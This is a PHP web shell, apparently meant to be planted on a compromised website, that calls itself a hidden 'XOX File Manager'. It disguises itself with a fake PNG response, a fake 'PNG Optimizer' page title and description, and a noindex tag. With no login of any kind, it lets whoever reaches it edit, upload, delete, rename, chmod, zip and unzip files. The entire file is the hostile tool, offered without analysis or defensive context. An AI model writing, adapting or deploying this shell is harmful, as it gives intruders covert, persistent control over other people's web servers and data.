<?php
// 🛡️ XOX File Manager (hidden)

// === Fake PNG for disguise (if ?i)
if (isset($_GET['i'])) {
    header("Content-Type: image/png");
    echo "\x89PNG\r\n\x1a\n"; // fake PNG header
    exit;
}

// === Init
error_reporting(E_ALL);
ini_set('display_errors', 1);

// === Restrict to Base Directory
$baseDir = getcwd(); // You can set this to a fixed path
$requestedDir = isset($_GET['go']) ? $_GET['go'] : $baseDir;
$dir = realpath($requestedDir);

// Security check: must be inside baseDir and be a directory
if (!$dir || strpos($dir, $baseDir) !== 0 || !is_dir($dir)) {
    die("❌ Access denied.");
}

$self = __FILE__;
$items = scandir($dir);

// === Actions
if (isset($_GET['delete'])) {
    $target = $dir . DIRECTORY_SEPARATOR . basename($_GET['delete']);
    if (is_file($target)) unlink($target);
    elseif (is_dir($target)) rmdir($target);
    echo "<p style='color:#fc4a4a'>🗑️ Deleted: " . htmlspecialchars($_GET['delete']) . "</p>";
}

if (isset($_POST['rename_from']) && isset($_POST['rename_to'])) {
    $from = $dir . DIRECTORY_SEPARATOR . basename($_POST['rename_from']);
    $to = $dir . DIRECTORY_SEPARATOR . basename($_POST['rename_to']);
    if (file_exists($from)) {
        rename($from, $to);
        echo "<p style='color:#4afc4a'>✏️ Renamed successfully.</p>";
    }
}

if (isset($_POST['perm_target']) && isset($_POST['perm_value'])) {
    $target = $dir . DIRECTORY_SEPARATOR . basename($_POST['perm_target']);
    $perm = intval($_POST['perm_value'], 8);
    if (file_exists($target)) {
        chmod($target, $perm);
        echo "<p style='color:#4afc4a'>🔐 Permissions changed to " . decoct($perm) . "</p>";
    }
}

if (isset($_GET['zip'])) {
    $zipTarget = $dir . DIRECTORY_SEPARATOR . basename($_GET['zip']);
    $zipFile = $zipTarget . '.zip';
    if (is_dir($zipTarget)) {
        $zip = new ZipArchive();
        if ($zip->open($zipFile, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
            $files = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($zipTarget, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
            foreach ($files as $file) {
                $pathInZip = substr($file->getPathname(), strlen($zipTarget) + 1);
                $zip->addFile($file->getPathname(), $pathInZip);
            }
            $zip->close();
            echo "<p style='color:#4afc4a'>📦 Zipped: " . htmlspecialchars(basename($zipFile)) . "</p>";
        }
    }
}

if (isset($_GET['unzip'])) {
    $zipPath = $dir . DIRECTORY_SEPARATOR . basename($_GET['unzip']);
    if (is_file($zipPath) && pathinfo($zipPath, PATHINFO_EXTENSION) === 'zip') {
        $zip = new ZipArchive();
        if ($zip->open($zipPath)) {
            $zip->extractTo($dir);
            $zip->close();
            echo "<p style='color:#4afc4a'>📂 Unzipped to <code>" . htmlspecialchars($dir) . "</code></p>";
        }
    }
}

if (isset($_GET['edit'])) {
    $targetFile = $dir . DIRECTORY_SEPARATOR . basename($_GET['edit']);
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content_save'])) {
        file_put_contents($targetFile, $_POST['content']);
        echo "<p style='color: #4afc4a;'>💾 Saved.</p>";
    }
    $code = @file_get_contents($targetFile);
    echo "<h2>✏️ Editing: " . htmlspecialchars($_GET['edit']) . "</h2>";
    echo "<form method='post'>
        <textarea name='content' rows='20' cols='100'>" . htmlspecialchars($code) . "</textarea><br>
        <input type='submit' name='content_save' value='💾 Save'>
        </form>
        <hr><a href='?go=" . urlencode($dir) . "'>🔙 Back</a>";
    exit;
}

if (isset($_FILES['dropfile'])) {
    $to = $dir . DIRECTORY_SEPARATOR . basename($_FILES['dropfile']['name']);
    move_uploaded_file($_FILES['dropfile']['tmp_name'], $to);
    echo "<p style='color:#4afc4a'>📤 Uploaded: " . htmlspecialchars($_FILES['dropfile']['name']) . "</p>";
}

if (isset($_POST['mkfolder']) && $_POST['mkfolder']) {
    $folder = $dir . DIRECTORY_SEPARATOR . basename($_POST['mkfolder']);
    if (!file_exists($folder)) {
        mkdir($folder);
        echo "<p style='color:#4afc4a'>📁 Folder created.</p>";
    } else {
        echo "<p style='color:#fc4a4a'>❌ Already exists.</p>";
    }
}

// === Sorting
$sort = isset($_GET['sort']) ? $_GET['sort'] : 'name';
$order = isset($_GET['order']) && $_GET['order'] === 'desc' ? 'desc' : 'asc';

usort($items, function($a, $b) use ($dir, $sort, $order) {
    if ($a === '.' || $a === '..') return -1;
    if ($b === '.' || $b === '..') return 1;
    $pathA = $dir . DIRECTORY_SEPARATOR . $a;
    $pathB = $dir . DIRECTORY_SEPARATOR . $b;
    if ($sort === 'size') {
        $valA = is_file($pathA) ? filesize($pathA) : 0;
        $valB = is_file($pathB) ? filesize($pathB) : 0;
    } elseif ($sort === 'perm') {
        $valA = fileperms($pathA);
        $valB = fileperms($pathB);
    } else {
        $valA = strtolower($a);
        $valB = strtolower($b);
    }
    return ($order === 'asc') ? $valA <=> $valB : $valB <=> $valA;
});

// === FAKE TITLE + META
echo "<!DOCTYPE html><html><head>
<title>PNG Optimizer | Dashboard</title>
<meta name='description' content='PNG Compression & Storage Tool'>
<meta name='robots' content='noindex,nofollow'>
<link rel='icon' type='image/png' href='data:image/png;base64,iVBORw0KGgo='>
<style>
body { background:#0f0f0f; color:#ccc; font-family:monospace; padding:15px; }
a { color:#6af; text-decoration:none; }
a:hover { text-decoration:underline; }
h2 { color:#fff; }
table { border-collapse:collapse; width:100%; }
td, th { padding:6px; border:1px solid #333; }
th { background-color:#1a1a1a; }
tr:hover { background-color:#1f1f1f; }
input[type='text'], select {
    background:#1e1e1e; color:#ccc; border:1px solid #444; padding:2px;
}
input[type='submit'], input[type='file'] {
    background:#333; color:#6af; border:1px solid #555; cursor:pointer;
}
form { display:inline; }
</style>
</head><body>";

// === Path Navigation
echo "<h2>🗂️ XOX File Manager</h2><hr>";

// === Table Header
echo "<table><tr>";
$headers = ['name' => 'Name', 'size' => 'Size', 'perm' => 'Permissions'];
foreach ($headers as $key => $label) {
    $new_order = ($sort === $key && $order === 'asc') ? 'desc' : 'asc';
    echo "<th><a href='?go=" . urlencode($dir) . "&sort=$key&order=$new_order'>" . htmlspecialchars($label) . "</a></th>";
}
echo "<th>Actions</th></tr>";

// === File List
foreach ($items as $item) {
    if ($item === '.' || $item === '..') continue; // ← blocks parent navigation

    $path = $dir . DIRECTORY_SEPARATOR . $item;
    $size = is_file($path) ? filesize($path) : '-';
    $perm = substr(sprintf('%o', fileperms($path)), -3);
    $permColor = is_writable($path) ? '#4afc4a' : '#fff';

    $name = is_dir($path)
        ? "📁 <a href='?go=" . urlencode($path) . "'>" . htmlspecialchars($item) . "</a>"
        : "📄 <a href='?go=" . urlencode($dir) . "&edit=" . urlencode($item) . "'>" . htmlspecialchars($item) . "</a>";

    $actions = [];
    if (is_file($path)) {
        $actions[] = "<a href='?go=" . urlencode($dir) . "&edit=" . urlencode($item) . "'>Edit</a>";
    }

    // Inline Rename
    if (isset($_GET['rename_from']) && $_GET['rename_from'] === $item) {
        $actions[] = "<form method='post'>
            <input type='hidden' name='rename_from' value='" . htmlspecialchars($item) . "'>
            <input type='text' name='rename_to' placeholder='New name' size='10'>
            <input type='submit' value='✔️'>
            <a href='?go=" . urlencode($dir) . "' style='color:#fc4a4a'>✖️</a>
        </form>";
    } else {
        $actions[] = "<a href='?go=" . urlencode($dir) . "&rename_from=" . urlencode($item) . "'>Rename</a>";
    }

    $actions[] = "<a href='?go=" . urlencode($dir) . "&delete=" . urlencode($item) . "' style='color:red' onclick='return confirm(\"Delete " . htmlspecialchars($item) . "?\")'>Delete</a>";

    if (is_dir($path)) {
        $actions[] = "<a href='?go=" . urlencode($dir) . "&zip=" . urlencode($item) . "'>ZIP</a>";
    } elseif (strtolower(pathinfo($item, PATHINFO_EXTENSION)) === 'zip') {
        $actions[] = "<a href='?go=" . urlencode($dir) . "&unzip=" . urlencode($item) . "'>Unzip</a>";
    }

    echo "<tr>
        <td>$name</td>
        <td>$size</td>
        <td style='color:$permColor'>$perm</td>
        <td>" . implode(' | ', $actions) . "</td>
    </tr>";
}
echo "</table><hr>";

// === Forms: Upload, Folder, Chmod
echo "<form method='post' enctype='multipart/form-data'>
<label>📤 Upload:</label> <input type='file' name='dropfile'>
<input type='submit' value='Upload'></form>";

echo "<form method='post'><label>📁 New Folder:</label>
<input type='text' name='mkfolder'><input type='submit' value='Create'></form>";

echo "<form method='post'><label>🔐 Permissions:</label>
<select name='perm_target'>";
foreach ($items as $item) {
    if ($item === '.' || $item === '..') continue;

    echo "<option value='" . htmlspecialchars($item) . "'>$item</option>";
}
echo "</select><input type='text' name='perm_value' placeholder='e.g. 755'>
<input type='submit' value='Change'></form>";

echo "</body></html>";

